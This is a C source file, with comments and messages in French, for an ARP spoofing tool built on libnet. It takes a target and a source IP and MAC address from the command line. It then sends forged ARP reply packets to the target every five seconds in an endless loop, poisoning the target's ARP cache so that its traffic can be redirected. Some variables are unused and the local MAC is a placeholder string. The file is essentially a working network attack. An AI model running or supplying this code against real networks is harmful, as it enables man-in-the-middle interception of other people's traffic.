#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <unistd.h>

void usage(){
        printf("Échec de l’extraction des arguments de ligne de commande\n");
        printf("Veuillez vous référer à l’utilisation");
        printf("main [targetIP] [targetMAC] [sourceIP] [sourceMAC]\n");
        exit(EXIT_FAILURE);
}

int main(int argc, char **argv){

        char *local_ip_p = "192.168.1.27"; // Local IP
        char *local_mac_p = "LOCAL MAC";
        uint32_t local_ip;                      // Local IP address
        uint8_t *local_mac;                     // local MAC address
        int A_length;

        libnet_ptag_t t_arp;                    // Paquet ARP pour cibler ptag
        libnet_ptag_t g_arp;                    // Paquet ARP vers ptag source

        libnet_ptag_t t_eth;                    // Paquet Ethernet vers ptag cible
        libnet_ptag_t g_eth;                    // Paquet Ethernet vers ptag source

        uint32_t target_ip;                     // Adresse IP cible
        uint8_t *target_mac;                    // Adresse MAC cible
        uint32_t source_ip;                     // Adresse IP source
        uint8_t *source_mac;                    // Adresse MAC source
        int T_length, G_length;


        if(argc != 5){
                usage();
        };

        libnet_t *l; 
        char err_buf[LIBNET_ERRBUF_SIZE];

        l = libnet_init(LIBNET_LINK, NULL, err_buf);

        // Si l’initialisation a échoué
        if(l == NULL){
                fprintf(stderr, "libnet_init() failed: %s\n", err_buf);
                exit(EXIT_FAILURE);
        };

        // Extraction d’arguments de ligne de commande et analyse
        printf("Analyse des entrées utilisateur\n");
        target_ip = libnet_name2addr4(l, argv[1], LIBNET_DONT_RESOLVE);
        target_mac = libnet_hex_aton(argv[2], &T_length);
        source_ip = libnet_name2addr4(l, argv[3], LIBNET_DONT_RESOLVE);
        source_mac= libnet_hex_aton(argv[4], &G_length);
        if(target_ip == -1 || target_mac == NULL || source_ip == -1 || source_mac == NULL){
                printf("Échec de l’analyse des entrées utilisateur\n");
                exit(EXIT_FAILURE);
        };

        // Récupérer les adresses IP et MAC locales
        printf("Récupération de l’adresse IP locale\n");
        local_ip = libnet_name2addr4(l, local_ip_p, LIBNET_DONT_RESOLVE);
        printf("Récupération de l’adresse MAC locale\n");
        local_mac = libnet_hex_aton(local_mac_p, &A_length);
        if(local_ip == -1 || local_mac == NULL){
                fprintf(stderr, "Impossible de récupérer les adresses IP et/ou MAC locales: %s\n", libnet_geterror(l));
                exit(EXIT_FAILURE);
        };

        while(1){
                // ARP PACKETS
                printf("Création d’en-têtes ARP\n");
                t_arp = libnet_autobuild_arp(
                                                ARPOP_REPLY,                                    
                                                source_mac,                                     
                                                (uint8_t *) &source_ip,                         
                                                target_mac,                                     
                                                (uint8_t *) &target_ip,                         
                                                l                                               
                                        );
                if(t_arp == -1){
                        fprintf(stderr, "Impossible de générer l’en-tête ARP (vers Target): %s\n", libnet_geterror(l));
                        exit(EXIT_FAILURE);
                };

                // Création d’en-têtes Ethernet
                printf("Création d’en-têtes Ethernet\n");
                t_eth = libnet_build_ethernet(
                                                target_mac,                                     // Adresse MAC cible
                                                (uint8_t *) source_mac,                         // Adresse MAC locale
                                                ETHERTYPE_ARP,                                  // Type de protocole supérieur (ARP)
                                                NULL,                                           // Payload
                                                0,                                              // longueur du payload
                                                l,                                              // Contexte Libnet
                                                0                                               // Ptag pour construire un paquet
                                        );
                if(t_eth == -1){
                        fprintf(stderr, "Impossible de créer un en-tête ETHERNET (vers Target): %s\n", libnet_geterror(l));
                        exit(EXIT_FAILURE);
                };

                // Packets
                printf("Écriture de paquets...\n");
                if ((libnet_write(l)) == -1){
                        fprintf(stderr, "Impossible d’envoyer un paquet: %s\n", libnet_geterror(l));
                        exit(EXIT_FAILURE);
                };

                // Temps
                sleep(5);

        }

        // Fin
        printf("Quitter...\n");
        free(target_mac);
        free(source_mac);

        libnet_destroy(l);

        return 0;
};
